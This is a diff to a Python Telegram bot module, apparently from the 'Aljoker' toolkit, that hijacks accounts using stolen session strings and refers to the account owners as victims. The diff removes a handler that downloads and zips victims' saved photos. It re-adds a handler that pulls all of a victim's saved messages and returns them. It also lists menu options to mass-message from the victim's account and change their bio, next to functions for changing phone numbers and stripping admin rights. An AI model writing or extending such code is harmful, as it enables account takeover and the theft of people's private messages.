@@ -7,7 +7,6 @@ from JoKeRUB.utils import admin_cmd
 import asyncio
 from ..Config import Config
 import os, asyncio, re
-import shutil
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 from telethon import TelegramClient as tg
@@ -35,14 +34,6 @@ async def change_number_code(strses, number, code, otp):
       return True
     except:
       return False
-
-async def get_saved_messages(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        saved_messages = []
-        async for message in X.iter_messages("me"):  # "me" تعني الرسائل المحفوظة
-            saved_messages.append(f"📩 {message.text}\n⏰ {message.date}\n\n")
-            # يمكنك إضافة المزيد من التفاصيل مثل المرفقات إذا أردت
-        return ''.join(saved_messages) if saved_messages else "لا توجد رسائل محفوظة"
 
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -109,30 +100,13 @@ async def demall(strses, grp):
       except:
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
-async def get_saved_photos(strses):
+async def get_saved_messages(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        photo_messages = []
-        async for message in X.iter_messages("me"):
-            if message.photo:
-                photo_info = f"📷 الصورة المرسلة في: {message.date}\n"
-                if message.text:
-                    photo_info += f"📝 النص المصاحب: {message.text}\n"
-                photo_messages.append(photo_info)
-        
-        if not photo_messages:
-            return "لا توجد صور في الرسائل المحفوظة"
-        
-        # تنزيل الصور فعلياً
-        try:
-            os.mkdir("saved_photos")
-        except:
-            pass
-            
-        async for message in X.iter_messages("me", limit=100):
-            if message.photo:
-                await message.download_media(f"saved_photos/photo_{message.id}.jpg")
-        
-        return "\n".join(photo_messages)
+        saved_messages = []
+        async for message in X.iter_messages("me"):  # "me" تعني الرسائل المحفوظة
+            saved_messages.append(f"📩 {message.text}\n⏰ {message.date}\n\n")
+            # يمكنك إضافة المزيد من التفاصيل مثل المرفقات إذا أردت
+        return ''.join(saved_messages) if saved_messages else "لا توجد رسائل محفوظة"
 
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -234,6 +208,12 @@ menu = '''
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
+"N" ~ [لأرسال رسالة الى جميع الاشخاص/ القروبات التي في حسابك]
+
+"O" ~ [لجلب الرسائل المحفوضة ]
+
+"X" ~ [لتغيير البايو ]
+
 '''
 mm = '''
 قم بلأنضمام الى الـقناة  @aqhvv
@@ -259,7 +239,6 @@ keyboard = [
     Button.inline("L", data="L"),
     Button.inline("M", data="M"),
     Button.inline("N", data="N"),
-    Button.inline("O", data="O"),
     Button.inline("X", data="X")
     ],
   [
@@ -279,7 +258,7 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
             result = builder.article(
                 title="Aljoker 🤡",
                 description="اضغط على الزر لعرض الأوامر.",
-                text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
+                text="**✧︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                 buttons=buttons
             )
         await event.answer([result] if result else None)
@@ -318,11 +297,10 @@ async def start(event):
         Button.inline("L", data="L"),
         Button.inline("M", data="M"),
         Button.inline("N", data="N"),
-        Button.inline("O", data="O"),
-        Button.inline("P", data="P")  # الزر الجديد للصور
+        Button.inline("O", data="O"),  # الزر الجديد
+        Button.inline("X", data="X")
     ],
     [
-        Button.inline("X", data="X"),
         Button.url("المـطور", "https://t.me/Lx5x5")
     ]
         ]
@@ -408,26 +386,6 @@ async def users(event):
     await joingroup(strses.text, grpid.text)
     await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
 
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الان ارسل الكود تيرمكس")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
-        
-        saved_msgs = await get_saved_messages(strses.text)
-        if len(saved_msgs) > 4096:
-            with open("saved_messages.txt", "w") as f:
-                f.write(saved_msgs)
-            await event.reply("الرسائل كثيرة جداً، تم حفظها في ملف", file="saved_messages.txt")
-            os.remove("saved_messages.txt")
-        else:
-            await event.reply(f"الرسائل المحفوظة:\n\n{saved_msgs}\n\nشكراً لأستخدامك البوت", buttons=keyboard)
-
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
@@ -489,52 +447,6 @@ async def users(event):
       	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك ايــڪاࢪ.", buttons=keyboard)
       else:
           await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @Ze_in22\n{i}")
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"P")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الان ارسل الكود تيرمكس")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if not op:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
-        
-        processing_msg = await event.respond("⏳ جاري جمع الصور من الرسائل المحفوظة...")
-        
-        try:
-            # تنظيف المجلد القديم إذا وجد
-            if os.path.exists("saved_photos"):
-                shutil.rmtree("saved_photos")
-            
-            result = await get_saved_photos(strses.text)
-            
-            if os.path.exists("saved_photos"):
-                # ضغط المجلد في ملف zip
-                shutil.make_archive("photos", 'zip', "saved_photos")
-                
-                # تقسيم النص إذا كان طويلاً
-                if len(result) > 1024:  # الحد الأقصى للوصف
-                    result_msg = "📁 تم جمع الصور بنجاح\n\n" + result[:1000] + "\n... (النص مقطوع بسبب الطول)"
-                else:
-                    result_msg = "📁 تم جمع الصور بنجاح\n\n" + result
-                
-                # إرسال الملف أولاً بدون وصف
-                await event.respond(file="photos.zip", 
-                                  caption="تم تنزيل ألبوم الصور المحفوظة")
-                
-                # ثم إرسال التفاصيل في رسالة منفصلة
-                await event.respond(result_msg)
-                
-                # تنظيف الملفات المؤقتة
-                os.remove("photos.zip")
-                shutil.rmtree("saved_photos")
-            else:
-                await event.respond(result)
-                
-        except Exception as e:
-            await event.respond(f"حدث خطأ: {str(e)}")
-        finally:
-            await processing_msg.delete()
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -612,7 +524,6 @@ async def users(event):
           await event.respond("هنالك خطأ ما حصل")
       except Exception as e:
         await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")
-
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
@@ -843,6 +754,26 @@ async def users(event):
       await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        
+        saved_msgs = await get_saved_messages(strses.text)
+        if len(saved_msgs) > 4096:
+            with open("saved_messages.txt", "w") as f:
+                f.write(saved_msgs)
+            await event.reply("الرسائل كثيرة جداً، تم حفظها في ملف", file="saved_messages.txt")
+            os.remove("saved_messages.txt")
+        else:
+            await event.reply(f"الرسائل المحفوظة:\n\n{saved_msgs}\n\nشكراً لأستخدامك البوت", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"X")))
 async def users(event):
